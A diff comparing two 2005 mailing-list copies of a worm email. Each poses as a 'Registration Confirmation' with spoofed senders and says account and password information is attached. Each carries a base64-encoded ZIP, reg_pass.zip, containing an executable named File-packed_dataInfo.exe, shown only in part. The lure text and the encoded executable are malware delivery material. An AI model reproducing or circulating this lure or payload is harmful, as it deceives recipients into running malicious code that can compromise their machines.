@@ -1,29 +1,29 @@
-From: hostmaster@21cn.com
+From: Admin@zf-lenksysteme.com
 Subject: Registration Confirmation
-Date: Thu, 08 Dec 2005 05:31:09 UTC
-Message-ID: <1ebb9b2229e76a3bf5@21cn.com>
+Date: Thu, 08 Dec 2005 06:39:51 UTC
+Message-ID: <59b35fd.bf0afdb3f1a9@ujxwoisnj.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="==dd0785de6dfa.d713ef5e31a3"
+Content-Type: multipart/mixed; boundary="======cdfa6fcbccb18c.b2eb07f"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: e-user@oss.sgi.com
+To: majordomo@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---==dd0785de6dfa.d713ef5e31a3
+--======cdfa6fcbccb18c.b2eb07f
 
 Account and Password Information are attached!
 
 
-***** Go to: http://www.21cn.com
-***** Email: postman@21cn.com
---==dd0785de6dfa.d713ef5e31a3
-Content-Type: application/octet-stream; name=reg_pass.zip
+***** Go to: http://www.zf-lenksysteme.com
+***** Email: postman@zf-lenksysteme.com
+--======cdfa6fcbccb18c.b2eb07f
+Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass.zip"
+Content-Disposition: attachment; filename="reg_pass-data.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---==dd0785de6dfa.d713ef5e31a3--
+--======cdfa6fcbccb18c.b2eb07f--
